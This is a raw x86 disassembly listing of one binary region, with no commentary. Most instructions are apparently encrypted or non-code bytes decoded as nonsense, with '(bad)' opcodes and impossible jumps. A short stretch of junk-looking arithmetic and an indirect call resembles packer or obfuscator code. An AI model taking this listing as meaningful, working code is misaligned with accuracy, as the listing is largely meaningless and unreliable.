  4072b5:	out    0x1d,al
  4072b7:	push   edi
  4072b8:	jg     0x4072cf
  4072ba:	add    BYTE PTR [eax],bh
  4072bc:	ja     0x40723e
  4072be:	out    0x42,al
  4072c0:	dec    edx
  4072c1:	mov    al,ds:0x9b9f4b8
  4072c6:	js     0x4072f4
  4072c8:	sub    edx,DWORD PTR [eax+edx*8]
  4072cb:	dec    ebx
  4072cc:	xchg   edx,eax
  4072cd:	pop    ds
  4072ce:	adc    al,0x74
  4072d0:	std    
  4072d1:	cmp    al,0xd9
  4072d3:	scas   eax,DWORD PTR es:[edi]
  4072d4:	xchg   ebx,eax
  4072d5:	xchg   esi,eax
  4072d6:	xchg   ebp,eax
  4072d7:	sbb    ebx,DWORD PTR [edx+0x5e]
  4072da:	pop    ss
  4072db:	jle    0x4072d8
  4072dd:	adc    eax,0xb9431ffc
  4072e2:	mov    bl,0xe4
  4072e4:	enter  0x3493,0xc7
  4072e8:	js     0x4072de
  4072ea:	jns    0x40732c
  4072ec:	retf   0xd0e0
  4072ef:	xor    DWORD PTR ss:[ebp-0x6],ebp
  4072f3:	jp     0x4072df
  4072f5:	jmp    0x407302
  4072f7:	cmp    DWORD PTR [esi+ecx*4],ebx
  4072fa:	or     cl,BYTE PTR [ecx]
  4072fc:	out    0x6f,al
  4072fe:	xor    BYTE PTR [ecx-0x7456486a],ah
  407304:	rep lods eax,DWORD PTR ds:[esi]
  407306:	ja     0x407290
  407308:	adc    esi,DWORD PTR [eax]
  40730a:	sbb    BYTE PTR [ebx+0x30],dh
  40730d:	(bad)  
  40730e:	(bad)  
  407310:	fwait
  407311:	dec    ebp
  407312:	in     eax,dx
  407313:	mov    esi,0x18a61153
  407318:	bound  esi,QWORD PTR [edx+0x2c13863]
  40731e:	pop    esi
  40731f:	retf   
  407320:	push   edi
  407321:	inc    ebx
  407322:	add    dl,BYTE PTR [esi+esi*8]
  407325:	mov    ds:0xfcb1ba0e,eax
  40732a:	push   ds
  40732b:	ret    
  40732c:	loopne 0x407361
  40732e:	sbb    al,0x14
  407330:	sti    
  407331:	mov    ebp,0x6869fdcb
  407336:	jno    0x40731d
  407338:	fsub   DWORD PTR [edi]
  40733a:	mov    cl,0x44
  40733c:	(bad)  
  40733e:	xor    BYTE PTR [ebx+ebx*1+0x71],ah
  407342:	leave  
  407343:	(bad)  
  407345:	retf   0x4b3b
  407348:	mov    cl,al
  40734a:	mov    ah,0x86
  40734c:	ret    0x3e5a
  40734f:	inc    edx
  407350:	out    dx,eax
  407351:	arpl   ax,si
  407353:	or     ebp,esp
  407355:	push   eax
  407356:	js     0x407384
  407358:	pop    ss
  407359:	and    al,0xd8
  40735b:	jnp    0x40732c
  40735d:	mov    dh,0x80
  40735f:	inc    ebp
  407360:	push   edx
  407361:	xchg   ebx,eax
  407362:	out    dx,al
  407363:	icebp  
  407364:	jle    0x4073b9
  407366:	mov    esp,0x97bf2842
  40736b:	sbb    dl,BYTE PTR [ebx-0x44]
  40736e:	ins    DWORD PTR es:[edi],dx
  40736f:	ss mov cl,bl
  407372:	jne    0x407313
  407374:	cmc    
  407375:	shl    BYTE PTR [edi+0xe1b30e3],cl
  40737b:	pop    ebp
  40737c:	sti    
  40737d:	push   ecx
  40737e:	add    eax,0xa2a29df6
  407383:	fldcw  WORD PTR [edx]
  407385:	xor    DWORD PTR [edx+0x4f],0x36
  407389:	rcr    edi,1
  40738b:	test   bl,al
  40738d:	dec    ebx
  40738e:	and    DWORD PTR ds:0xd7a98ef1,edi
  407394:	xor    DWORD PTR gs:[edx-0x60],ebx
  407398:	not    DWORD PTR ss:[edx]
  40739b:	push   ecx
  40739c:	nop
  40739d:	cli    
  40739e:	retf   
  40739f:	lock jp 0x407362
  4073a2:	nop
  4073a3:	dec    edi
  4073a4:	repz fadd st(1),st
  4073a7:	and    al,0xc9
  4073a9:	movups xmm3,xmm7
  4073ac:	sbb    al,0x4
  4073ae:	sub    eax,0x1097565a
  4073b3:	dec    ebp
  4073b4:	in     al,0x8e
  4073b6:	adc    ebp,DWORD PTR [edi+eiz*2]
  4073b9:	mov    al,ds:0xc4d89b3a
  4073be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073bf:	dec    eax
  4073c0:	shl    ebx,cl
  4073c2:	sbb    DWORD PTR [ebp-0x2fae7507],esp
  4073c8:	hlt    
  4073c9:	fistp  WORD PTR [esi]
  4073cb:	and    esp,DWORD PTR [ebx-0x343c76f5]
  4073d1:	shl    BYTE PTR [ebx-0x44fa6f7e],cl
  4073d7:	push   ebx
  4073d8:	iret   
  4073d9:	dec    edi
  4073da:	inc    esi
  4073db:	test   eax,0x8039dc7
  4073e0:	imul   BYTE PTR [eax-0x49bc61d7]
  4073e6:	cmp    bl,al
  4073e8:	mov    WORD PTR [ecx+0x213f4abd],cs
  4073ee:	sbb    ecx,edx
  4073f0:	das    
  4073f1:	inc    ebx
  4073f2:	xlat   BYTE PTR ds:[ebx]
  4073f3:	inc    edx
  4073f4:	leave  
  4073f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073f6:	repz xchg edx,eax
  4073f8:	int3   
  4073f9:	fidiv  WORD PTR [edx+eiz*1]
  4073fc:	das    
  4073fd:	jecxz  0x4073c8
  4073ff:	mov    ecx,0xafb8c205
  407404:	int3   
  407405:	retf   0x2ece
  407408:	pop    es
  407409:	mov    esi,0xa5dc7c0f
  40740e:	aam    0x73
  407410:	mov    esp,0xf7204deb
  407415:	shr    BYTE PTR [ebx+0x5b],0xb6
  407419:	mov    esp,0xfbceb410
  40741e:	mov    ?,WORD PTR [ebx]
  407420:	add    al,0xa3
  407422:	sub    al,0xc6
  407424:	cmp    DWORD PTR [ebx+0x59],ebx
  407427:	adc    al,0x4a
  407429:	popa   
  40742a:	add    BYTE PTR [edx-0x7b86252e],ch
  407430:	cmp    al,0x2c
  407432:	test   al,0x8c
  407434:	or     al,0xee
  407436:	loope  0x4073fb
  407438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407439:	cmp    ebx,DWORD PTR [edi]
  40743b:	dec    edx
  40743c:	mov    edx,0x70b647b8
  407441:	pop    ss
  407442:	mov    dl,0x4c
  407444:	jl     0x407498
  407446:	pop    edx
  407447:	shrd   edi,edx,0xa9
  40744b:	fwait
  40744c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40744d:	mov    ebx,0x8a786033
  407452:	pop    ebp
  407453:	fbld   TBYTE PTR [ecx]
  407455:	cli    
  407456:	and    al,0xc4
  407458:	out    dx,eax
  407459:	mov    bl,0x4f
  40745b:	fdiv   DWORD PTR [esi]
  40745d:	jmp    0x407435
  40745f:	les    ebx,FWORD PTR [ecx+0x358b458c]
  407465:	loope  0x4074c2
  407467:	mov    edx,0x19f2ff81
  40746c:	fiadd  WORD PTR [esi+eax*2-0x33bf2d68]
  407473:	scas   eax,DWORD PTR es:[edi]
  407474:	adc    ebp,DWORD PTR fs:[esi]
  407477:	add    ecx,DWORD PTR [esi-0x261569be]
  40747d:	pop    es
  40747e:	xor    al,0xab
  407480:	and    DWORD PTR [ebx],0xffffff82
  407483:	sub    al,0x55
  407485:	fdiv   st,st(6)
  407487:	std    
  407488:	out    dx,al
  407489:	rcr    DWORD PTR [ebx+0x20],0xe
  40748d:	cmp    eax,0xa002787e
  407492:	mov    edi,0xc4fdeec4
  407497:	push   eax
  407498:	lods   al,BYTE PTR ds:[esi]
  407499:	push   edx
  40749a:	mov    esp,0x73b1f138
  40749f:	push   ecx
  4074a0:	stos   BYTE PTR es:[edi],al
  4074a1:	pop    esp
  4074a2:	call   0x699a05d9
  4074a7:	jmp    0x407472
  4074a9:	jmp    0x31e09daa
  4074ae:	add    dl,dh
  4074b0:	or     bh,al
  4074b2:	add    eax,0xfa988eac
  4074b7:	sbb    DWORD PTR [ecx],eax
  4074b9:	jae    0x4074d1
  4074bb:	mov    ?,esi
  4074bd:	ss loop 0x407529
  4074c0:	jmp    0x407506
  4074c2:	xchg   edi,eax
  4074c3:	popf   
  4074c4:	shl    DWORD PTR [edi+0x6ea6682a],cl
  4074ca:	out    dx,eax
  4074cb:	outs   dx,DWORD PTR ds:[esi]
  4074cc:	push   ecx
  4074cd:	outs   dx,BYTE PTR ds:[esi]
  4074ce:	push   0x61
  4074d0:	mov    WORD PTR [ecx],fs
  4074d2:	sub    BYTE PTR [esi-0x35358d0f],0x65
  4074d9:	adc    edi,edi
  4074db:	jecxz  0x4074d3
  4074dd:	add    ebx,DWORD PTR [edi+0x1a09034a]
  4074e3:	push   esp
  4074e4:	fld    TBYTE PTR [ecx+0x2e216f0]
  4074ea:	mov    ch,BYTE PTR [ecx]
  4074ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ed:	bound  esi,QWORD PTR [ecx]
  4074ef:	mov    al,0xee
  4074f1:	or     al,0xae
  4074f3:	(bad)  
  4074f4:	je     0x407554
  4074f6:	das    
  4074f7:	sub    BYTE PTR [ecx],0xbe
  4074fa:	(bad)  
  4074fb:	out    dx,al
  4074fc:	mov    ebp,0x5604691
  407501:	es push cs
  407503:	pop    esi
  407504:	(bad)  
  407505:	adc    eax,0x8527f600
  40750a:	lea    ecx,[edx-0x3e632919]
  407510:	pop    ebx
  407511:	xor    al,0x5a
  407513:	or     eax,edx
  407515:	or     BYTE PTR [ebp-0x4b837d9f],ch
  40751b:	jg     0x4074b4
  40751d:	jecxz  0x407557
  40751f:	fld    QWORD PTR [esi-0x73057d18]
  407525:	push   eax
  407526:	lods   al,BYTE PTR ds:[esi]
  407527:	xchg   ebx,eax
  407528:	outs   dx,DWORD PTR ds:[esi]
  407529:	dec    eax
  40752a:	(bad)
  40752e:	sub    BYTE PTR [edx+0x1662af4d],bh
  407534:	fild   DWORD PTR [ebx+eiz*2+0x418b4d62]
  40753b:	scas   al,BYTE PTR es:[edi]
  40753c:	fmul   QWORD PTR [edx]
  40753e:	xlat   BYTE PTR ds:[ebx]
  40753f:	(bad)  
  407540:	sub    al,0x1
  407542:	jmp    0xf06a129c
  407547:	lods   eax,DWORD PTR ds:[esi]
  407548:	int    0x6f
  40754a:	jmp    0x4075c0
  40754c:	and    al,0xd
  40754e:	(bad)  
  40754f:	in     eax,dx
  407550:	inc    esi
  407551:	pop    ds
  407552:	int3   
  407553:	mov    bh,0x5
  407555:	and    BYTE PTR [ebx],0x2e
  407558:	fstp   TBYTE PTR [ebx-0x31]
  40755b:	in     al,dx
  40755c:	out    dx,al
  40755d:	aaa    
  40755e:	push   es
  40755f:	cmp    al,0x90
  407561:	dec    BYTE PTR [ebx+eiz*4-0x67]
  407565:	daa    
  407566:	dec    edx
  407567:	sbb    BYTE PTR [edi+ecx*1+0xf],dh
  40756b:	jle    0x40759d
  40756d:	mov    BYTE PTR [eax+0x1559bc61],al
  407573:	sbb    dl,BYTE PTR [ebp-0x47]
  407576:	addr16 push edx
  407578:	pop    ebp
  407579:	push   ss
  40757a:	sar    DWORD PTR [ecx],1
  40757c:	adc    ecx,esp
  40757e:	sbb    BYTE PTR [ecx+esi*8],bl
  407581:	dec    DWORD PTR [ebx]
  407583:	or     DWORD PTR [eax],edx
  407585:	jge    0x407565
  407587:	xchg   esi,eax
  407588:	aaa    
  407589:	jecxz  0x4075bb
  40758b:	(bad)  
  40758c:	fwait
  40758d:	loopne 0x40755f
  40758f:	pop    ebx
  407590:	mov    dh,BYTE PTR [esi]
  407592:	jne    0x4075df
  407594:	push   edi
  407595:	dec    ebx
  407596:	fadd   QWORD PTR [ebx-0x17]
  407599:	scas   al,BYTE PTR es:[edi]
  40759a:	lds    edi,FWORD PTR [ebx+0x4f]
  40759d:	mov    BYTE PTR [ebx],al
  40759f:	pop    eax
  4075a0:	mov    ds:0xa8c54758,al
  4075a5:	jl     0x407598
  4075a7:	dec    ecx
  4075a8:	das    
  4075a9:	mov    ebp,0xccd164e1
  4075ae:	int    0x80
  4075b0:	sbb    eax,0x5ca81ce5
  4075b5:	retf   
  4075b6:	inc    edi
  4075b7:	int    0x16
  4075b9:	les    ecx,FWORD PTR [edi]
  4075bb:	ss mov ebx,0xe5599a2d
  4075c1:	and    al,0xff
  4075c3:	std    
  4075c4:	push   esi
  4075c5:	sbb    bh,BYTE PTR [esi]
  4075c7:	jo     0x4075df
  4075c9:	xchg   DWORD PTR [edx-0x391fb60c],ebp
  4075cf:	sub    ebx,ebp
  4075d1:	jns    0x407609
  4075d3:	cmp    al,0x72
  4075d5:	mov    dh,0xf0
  4075d7:	(bad)  
  4075d8:	mov    bl,0xbb
  4075da:	div    edi
  4075dc:	aad    0xc1
  4075de:	mov    eax,0x7fa578e2
  4075e3:	mov    DWORD PTR [eax-0x4c4646b3],esi
  4075e9:	mov    esp,DWORD PTR [ecx+0x4d6dccc0]
  4075ef:	(bad)  
  4075f0:	fsubp  st(4),st
  4075f2:	cdq    
  4075f3:	dec    esp
  4075f4:	gs jne 0x40762c
  4075f7:	icebp  
  4075f8:	(bad)  
  4075f9:	fisub  DWORD PTR [ebx-0x5d]
  4075fc:	call   0xb2dc6c58
  407601:	stc    
  407602:	cmc    
  407603:	scas   al,BYTE PTR es:[edi]
  407604:	cwde   
  407605:	test   eax,0xe55d32a4
  40760a:	lds    ebx,FWORD PTR [edi-0x51]
  40760d:	leave  
  40760e:	outs   dx,DWORD PTR ds:[esi]
  40760f:	jb     0x4075df
  407611:	int3   
  407612:	icebp  
  407613:	data16 lods al,BYTE PTR ds:[esi]
  407615:	je     0x407657
  407617:	add    al,0xe8
  407619:	push   cs
  40761a:	gs out 0x7a,eax
  40761d:	xchg   edi,eax
  40761e:	mov    eax,ds:0xcfe1da2e
  407623:	inc    ecx
  407624:	and    ch,BYTE PTR [ebp+0x42]
  407627:	call   0x4283:0x8756553d
  40762e:	aas    
  40762f:	(bad)  
  407630:	lods   al,BYTE PTR ds:[esi]
  407631:	jbe    0x4076ac
  407633:	pop    ss
  407634:	or     cl,dh
  407636:	out    dx,eax
  407637:	sbb    DWORD PTR [esi+0x40],edi
  40763a:	lds    ebx,FWORD PTR [ecx]
  40763c:	inc    esi
  40763d:	jb     0x407662
  40763f:	ffree  st(5)
  407641:	ss push esp
  407643:	or     DWORD PTR [eax-0x55],eax
  407646:	sbb    eax,ebp
  407648:	stc    
  407649:	sub    ebp,DWORD PTR [eax+0x5e]
  40764c:	push   ds
  40764d:	jmp    0x1fed:0xf97a46f3
  407654:	psraw  mm2,mm7
  407657:	imul   ecx,DWORD PTR [esi+0x2c],0x9fff730f
  40765e:	inc    esi
  40765f:	into   
  407660:	rcl    BYTE PTR [edi],cl
  407662:	pop    ebx
  407663:	and    al,BYTE PTR [edx]
  407665:	aad    0x1e
  407667:	push   ebx
  407668:	iret   
  407669:	jp     0x40766b
  40766b:	rcl    DWORD PTR [ecx+0x155d657d],cl
  407671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407672:	ficom  WORD PTR [edx+eiz*8+0x7f]
  407676:	out    0xbe,al
  407678:	dec    eax
  407679:	ret    
  40767a:	ror    eax,1
  40767c:	in     al,0xc1
  40767e:	and    eax,0x53681435
  407683:	push   cs
  407684:	sub    eax,0x5996875e
  407689:	pop    ds
  40768a:	cs jno 0x407662
  40768d:	xchg   edx,eax
  40768e:	jp     0x40770c
  407690:	pop    edi
  407691:	push   ds
  407692:	shl    DWORD PTR [eax],cl
  407694:	(bad)  
  407695:	push   edi
  407696:	test   cl,al
  407698:	jmp    0x4d8b:0xe44d8902
  40769f:	sbb    BYTE PTR [ecx+0x4229a62d],al
  4076a5:	add    BYTE PTR [edx+0x42],bl
  4076a8:	add    BYTE PTR [eax],al
  4076aa:	mov    edx,DWORD PTR [ebp+0x1c]
  4076ad:	or     DWORD PTR ds:0x4228da,0x210e
  4076b7:	xor    DWORD PTR [ebp-0x1c],edi
  4076ba:	or     DWORD PTR ds:0x422962,0x4229ce
  4076c4:	xor    edx,edx
  4076c6:	or     edx,DWORD PTR [ebp-0x1c]
  4076c9:	or     DWORD PTR ds:0x4228ce,0x4229c2
  4076d3:	shl    ecx,0x1e
  4076d6:	dec    DWORD PTR ds:0x4228f2
  4076dc:	add    edx,DWORD PTR [ebp-0x2c]
  4076df:	add    DWORD PTR [eax],edx
  4076e1:	sbb    eax,0x3637
  4076e6:	mov    eax,DWORD PTR [esi]
  4076e8:	sub    DWORD PTR ds:0x42292a,ebx
  4076ee:	mov    ecx,DWORD PTR [esi+0x4]
  4076f1:	movzx  edx,BYTE PTR ds:0x42290a
  4076f8:	sub    edx,DWORD PTR ds:0x42292e
  4076fe:	mov    DWORD PTR ds:0x42290a,edx
  407704:	shrd   eax,ecx,0x2
  407708:	shr    ecx,0x2
  40770b:	sub    edx,edx
  40770d:	mov    ecx,DWORD PTR [esi]
  40770f:	cmp    DWORD PTR ds:0x422956,0x0
  407716:	mov    DWORD PTR ds:0x422992,0x518b
  407720:	mov    edx,DWORD PTR ds:0x4228ee
  407726:	mov    DWORD PTR ds:0x4229b6,0x962
  407730:	jmp    0x40778a
  407735:	mov    DWORD PTR ds:0x422992,0x300f
  40773f:	mov    DWORD PTR ds:0x42296a,0xfe3
  407749:	jne    0x407770
  40774f:	push   0x0
  407751:	push   0x5aa3
  407756:	push   0x671f
  40775b:	push   DWORD PTR [ebp-0x10]
  40775e:	call   DWORD PTR ds:0x42a178
  407764:	and    DWORD PTR ds:0x42296a,ecx
  40776a:	sub    edx,0x694d
  407770:	inc    edx
  407771:	adc    DWORD PTR ds:0x4228be,0x1a32
  40777b:	dec    edx
  40777c:	mov    edx,DWORD PTR ds:0x4229fe
  407782:	mov    edx,DWORD PTR [edx]
  407784:	xor    DWORD PTR ds:0x422922,edx
  40778a:	mov    edx,DWORD PTR [esi+0x4]
  40778d:	xor    eax,edi
  40778f:	shl    ecx,0x1e
  407792:	xor    edx,edx
  407794:	or     edx,eax
  407796:	xor    eax,eax
  407798:	add    eax,DWORD PTR ds:0x4229c2
  40779e:	adc    eax,DWORD PTR ds:0x42298e
  4077a4:	mov    ds:0x4229c2,eax
  4077a9:	jmp    0x407d33
  4077ae:	jle    0x407760
  4077b0:	fucomp st(4)
  4077b2:	sbb    DWORD PTR [eax-0x7c58e782],esp
  4077b8:	test   BYTE PTR [edx-0x4d3da534],dh
  4077be:	mul    DWORD PTR [ebx+0x16]
  4077c1:	push   ss
  4077c2:	cmp    eax,0xe1161604
  4077c7:	cs adc eax,0xeb14b1dd
  4077cd:	test   al,0x61
  4077cf:	loopne 0x407831
  4077d1:	mov    ecx,0xb1314bf5
  4077d6:	arpl   WORD PTR [eax],dx
  4077d8:	sbb    al,0xe9
  4077da:	cmp    esi,esp
  4077dc:	push   edi
  4077dd:	adc    esp,ebp
  4077df:	cmp    DWORD PTR [esi+0x2c067d82],0xa5d3643e
  4077e9:	and    bl,BYTE PTR [ebp+0x2969ef78]
  4077ef:	dec    eax
  4077f0:	rcr    BYTE PTR [ecx],0x8a
  4077f3:	cmp    al,0x12
  4077f5:	adc    ebx,edx
  4077f7:	or     esi,DWORD PTR [eax+ecx*8+0x21868ae5]
  4077fe:	nop
  4077ff:	int    0x7
  407801:	mov    dh,0xfe
  407803:	cs push 0x3c727af6
  407809:	pop    esi
  40780a:	jp     0x407816
  40780c:	push   0x1ac56c02
  407811:	adc    cl,bh
  407813:	jge    0x4077e3
  407815:	not    DWORD PTR [edx]
  407817:	sub    eax,0x3dfbcdc8
  40781c:	sub    dh,BYTE PTR [eax+0x23c5018d]
  407822:	arpl   WORD PTR [eax],dx
  407824:	shl    BYTE PTR [edi],1
  407826:	add    esp,DWORD PTR [esi]
  407828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407829:	ret    
  40782a:	mov    edi,edx
  40782c:	push   cs
  40782d:	ins    BYTE PTR es:[edi],dx
  40782e:	ins    DWORD PTR es:[edi],dx
  40782f:	cwde   
  407830:	pop    eax
  407831:	cmp    al,0x36
  407833:	mov    ds:0x895edea2,eax
  407838:	pop    ebp
  407839:	or     eax,0x5c07fd10
  40783e:	clc    
  40783f:	(bad)  
  407840:	repz mov ds:0x1f0de7fd,al
  407846:	aam    0xee
  407848:	sbb    BYTE PTR [ecx+ecx*8],dh
  40784b:	jge    0x407871
  40784d:	pop    es
  40784e:	stc    
  40784f:	stos   DWORD PTR es:[edi],eax
  407850:	xor    BYTE PTR [edi+0x2e891bba],bh
  407856:	mov    edx,0xf283a0ae
  40785b:	(bad)  
  40785c:	fdiv   DWORD PTR [ebp-0x6b02e234]
  407862:	cwde   
  407863:	add    BYTE PTR [edx-0x5e],ah
  407866:	lods   al,BYTE PTR ds:[esi]
  407867:	addr16 cmp eax,0xb9ee4158
  40786d:	xor    BYTE PTR [edx*4-0x6f1b37f5],bh
  407874:	js     0x40786a
  407876:	pop    ecx
  407877:	in     al,dx
  407878:	lods   eax,DWORD PTR ds:[esi]
  407879:	mov    BYTE PTR [ebp+0x3bbefcb3],bh
  40787f:	imul   esp,esi,0x182357ef
  407885:	aas    
  407886:	xchg   esp,eax
  407887:	pop    esp
  407888:	outs   dx,BYTE PTR ds:[esi]
  407889:	daa    
  40788a:	outs   dx,DWORD PTR ds:[esi]
  40788b:	mov    esp,0xd013ae7f
  407890:	(bad)  
  407891:	fnstcw WORD PTR [ebp+esi*4+0x36efcc55]
  407898:	and    BYTE PTR [ebp-0x3e],bh
  40789b:	push   ds
  40789c:	xchg   BYTE PTR [esi+edi*1+0x1b],dl
  4078a0:	xor    al,BYTE PTR [eax]
  4078a2:	rol    BYTE PTR [ebx+0x6504a563],0x8f
  4078a9:	inc    ecx
  4078aa:	dec    edi
  4078ab:	sbb    eax,0xc367fc0
  4078b0:	leave  
  4078b1:	iret   
  4078b2:	pop    ebx
  4078b3:	push   0xb04c87d8
  4078b8:	cmp    bh,BYTE PTR [eax-0x46e74152]
  4078be:	adc    ah,BYTE PTR [esi+0x1fc24cb6]
  4078c4:	ds jle 0x4078e0
  4078c7:	(bad)  
  4078c8:	(bad)  
  4078c9:	data16 lahf 
  4078cb:	shr    BYTE PTR [ecx+0x477be9c8],1
  4078d1:	lods   eax,DWORD PTR ds:[esi]
  4078d2:	jmp    0x40785c
  4078d4:	pop    esi
  4078d5:	gs dec ebx
  4078d7:	in     eax,0x48
  4078d9:	or     cl,BYTE PTR [edi]
  4078db:	pushf  
  4078dc:	mov    BYTE PTR [edx],cl
  4078de:	repz or edx,0x2d97e6a7
  4078e5:	push   cs
  4078e6:	outs   dx,BYTE PTR ds:[esi]
  4078e7:	cli    
  4078e8:	nop
  4078e9:	cmp    BYTE PTR [eax-0xef68535],dl
  4078ef:	mov    DWORD PTR [ebp-0x711eae78],esi
  4078f5:	addr16 dec eax
  4078f7:	xor    BYTE PTR [edi+0x2f],dl
  4078fa:	xor    eax,DWORD PTR ds:0x2c50a248
  407900:	pop    ds
  407901:	mov    dh,0x40
  407903:	ds jne 0x40794d
  407906:	shl    DWORD PTR [esi+0x4a],0x8f
  40790a:	mov    cl,0xa5
  40790c:	add    al,0xd
  40790e:	imul   ecx,ebp,0xffffffca
  407911:	out    0xe,al
  407913:	add    al,0xe4
  407915:	aam    0x7c
  407917:	(bad)  
  407918:	fild   QWORD PTR [bx+di-0x6a64]
  40791d:	imul   eax,DWORD PTR [ebp-0x28],0xb
  407921:	push   0xffffffce
  407923:	mov    eax,0xd922a82e
  407928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407929:	mov    dl,0xb3
  40792b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40792c:	cwde   
  40792d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792e:	jmp    0x4078e7
  407930:	jecxz  0x4078c6
  407932:	adc    ecx,DWORD PTR [ebp-0x30bc3972]
  407938:	addr16 xor eax,0xfef438b5
  40793e:	and    eax,0x16cb622b
  407943:	xor    dl,BYTE PTR [eax]
  407945:	nop
  407946:	lods   al,BYTE PTR ds:[esi]
  407947:	outs   dx,DWORD PTR ds:[esi]
  407948:	push   cs
  407949:	mov    dh,BYTE PTR [eax+0x4cb07896]
  40794f:	repnz aas 
  407951:	cmp    esi,DWORD PTR [ecx+0x6bc094db]
  407957:	cld    
  407958:	leave  
  407959:	outs   dx,DWORD PTR ds:[esi]
  40795a:	pop    esp
  40795b:	dec    ebx
  40795c:	ret    0x21e0
  40795f:	push   ebp
  407960:	mov    cl,0x7d
  407962:	xchg   esi,eax
  407963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407964:	push   ds
  407965:	xchg   al,ah
  407967:	scas   eax,DWORD PTR es:[edi]
  407968:	and    al,0xe5
  40796a:	push   esi
  40796b:	dec    ebx
  40796c:	dec    esp
  40796d:	data16 jo 0x407969
  407970:	push   edi
  407971:	xchg   ecx,eax
  407972:	es clc 
  407974:	je     0x40798d
  407976:	jmp    0x407925
  407978:	mov    ebp,0x492f561d
  40797d:	push   edi
  40797e:	cmp    al,0x67
  407980:	jb     0x40790c
  407982:	in     eax,0x72
  407984:	inc    sp
  407986:	(bad)  
  407987:	bswap  edx
  407989:	sub    DWORD PTR [edx],ebp
  40798b:	xchg   ebx,eax
  40798c:	loope  0x4079b5
  40798e:	dec    edi
  40798f:	inc    ebx
  407990:	aas    
  407991:	ds inc ebx
  407993:	xor    BYTE PTR [ebx],bl
  407995:	cs lock test eax,0x4aafcd55
  40799c:	and    eax,edi
  40799e:	dec    ecx
  40799f:	push   ecx
  4079a0:	int3   
  4079a1:	dec    esp
  4079a2:	and    ch,BYTE PTR [ebp-0xc55eac7]
  4079a8:	mov    al,ds:0x9321b63
  4079ad:	imul   edi,ecx,0xc064f438
  4079b3:	lahf   
  4079b4:	sbb    ch,BYTE PTR [esi+edi*1+0x21647280]
  4079bb:	pop    edi
  4079bc:	test   DWORD PTR [esi-0x74d6ad76],esi
  4079c2:	in     eax,0x93
  4079c4:	mov    bl,0x95
  4079c6:	in     al,dx
  4079c7:	test   ecx,eax
  4079c9:	fld    TBYTE PTR [eax+0x3ab71b22]
  4079cf:	aas    
  4079d0:	popa   
  4079d1:	jae    0x407966
  4079d3:	add    BYTE PTR [eax],dh
  4079d5:	fdivr  DWORD PTR [eax]
  4079d7:	ins    BYTE PTR es:[edi],dx
  4079d8:	idiv   DWORD PTR [ebx]
  4079da:	in     eax,dx
  4079db:	cli    
  4079dc:	fnsave [eax+0x743372e7]
  4079e2:	fst    DWORD PTR [ebp+0x56701cec]
  4079e8:	retf   0xa32d
  4079eb:	mov    cl,0x26
  4079ed:	dec    edi
  4079ee:	js     0x407a55
  4079f0:	sbb    eax,0x3e6ed42f
  4079f5:	rcr    DWORD PTR ss:[eax+0x1b24e8d7],cl
  4079fc:	pop    esp
  4079fd:	in     ax,dx
  4079ff:	outs   dx,BYTE PTR ds:[esi]
  407a00:	lods   eax,DWORD PTR ds:[esi]
  407a01:	and    al,0xb0
  407a03:	sbb    edx,ebx
  407a05:	and    al,ah
  407a07:	and    eax,0xb08619c
  407a0c:	or     eax,0xfa00caab
  407a11:	xor    DWORD PTR [eax-0x1],edi
  407a14:	or     al,cl
  407a16:	inc    esp
  407a17:	push   ecx
  407a18:	mov    ch,0xfb
  407a1a:	hlt    
  407a1b:	lock (bad) 
  407a1d:	xor    DWORD PTR [ebp+0x70],esi
  407a20:	dec    esp
  407a21:	aas    
  407a22:	and    eax,0xf4c3dd0e
  407a27:	es jp  0x407a31
  407a2a:	mov    edx,0xe94eb26b
  407a2f:	pop    ebp
  407a30:	pop    ss
  407a31:	std    
  407a32:	dec    esi
  407a33:	pop    esi
  407a34:	inc    esp
  407a35:	in     eax,0xec
  407a37:	inc    edx
  407a38:	dec    esi
  407a39:	mov    ch,0xce
  407a3b:	mov    edi,DWORD PTR [edi-0x61986ddd]
  407a41:	jmp    0x407abb
  407a43:	inc    ecx
  407a44:	sbb    al,0xc7
  407a46:	std    
  407a47:	and    DWORD PTR [esi],esi
  407a49:	les    ebx,FWORD PTR [ecx-0x161adb55]
  407a4f:	jb     0x407a76
  407a51:	(bad)  
  407a52:	xor    al,0xeb
  407a54:	loope  0x407a6e
  407a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a57:	and    BYTE PTR [ecx-0x4e],bl
  407a5a:	mov    al,ds:0x13285a72
  407a5f:	gs cmp al,0xac
  407a62:	retf   
  407a63:	shl    BYTE PTR [esi-0x4],0x89
  407a67:	mov    bh,0x61
  407a69:	jmp    0x4b82:0xca6c8a1
  407a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a71:	mov    edi,ebp
  407a73:	push   edi
  407a74:	push   edi
  407a75:	adc    ah,dh
  407a77:	push   ss
  407a78:	xor    eax,0x24758e3f
  407a7d:	jbe    0x407a95
  407a7f:	lods   al,BYTE PTR ds:[esi]
  407a80:	popf   
  407a81:	shr    DWORD PTR ds:0xefab4eb0,cl
  407a87:	cmp    eax,0xebfbf80a
  407a8c:	ficom  DWORD PTR [edx-0x80]
  407a8f:	pop    esp
  407a90:	mov    eax,0xa40e8963
  407a95:	mov    dh,0x5d
  407a97:	add    ebx,esp
  407a99:	aas    
  407a9a:	mov    eax,ebx
  407a9c:	addr16 stc 
  407a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a9f:	and    al,0x4b
  407aa1:	push   0xffffffd6
  407aa3:	dec    edi
  407aa4:	pop    ebx
  407aa5:	jae    0x407a32
  407aa7:	mov    esp,0x81e57ff8
  407aac:	test   eax,0x6158f43d
  407ab1:	fistp  WORD PTR [edi-0x33]
  407ab4:	xchg   edi,eax
  407ab5:	pop    ecx
  407ab6:	pop    edx
  407ab7:	push   0x43ad9a61
  407abc:	shl    DWORD PTR [ecx+0x3c68d03c],1
  407ac2:	jbe    0x407a9c
